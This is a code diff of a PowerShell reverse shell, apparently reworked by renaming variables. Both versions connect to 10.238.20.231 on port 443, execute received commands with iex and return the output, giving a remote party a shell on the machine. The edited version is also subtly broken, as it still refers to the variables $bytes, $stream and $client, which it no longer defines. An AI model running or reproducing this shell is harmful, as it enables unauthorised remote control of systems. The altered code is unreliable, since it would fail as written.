@@ -1,10 +1,12 @@
-$client = New-Object System.Net.Sockets.TCPClient("10.238.20.231",443);
-$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-    $sendback = (iex $data 2>&1 | Out-String );
-    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-    $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()
+$c = New-Object System.Net.Sockets.TCPClient("10.238.20.231",443);
+$s = $c.GetStream();
+[byte[]]$b = 0..65535|%{0};
+while(($i = $s.Read($bytes, 0, $b.Length)) -ne 0){
+    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
+    $sb= (iex $d 2>&1 | Out-String );
+    $sb2 = $sb + "PS " + (pwd).Path + "> ";
+    $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
+    $stream.Write($sbt,0,$sbt.Length);
+    $stream.Flush()
 };
 $client.Close()
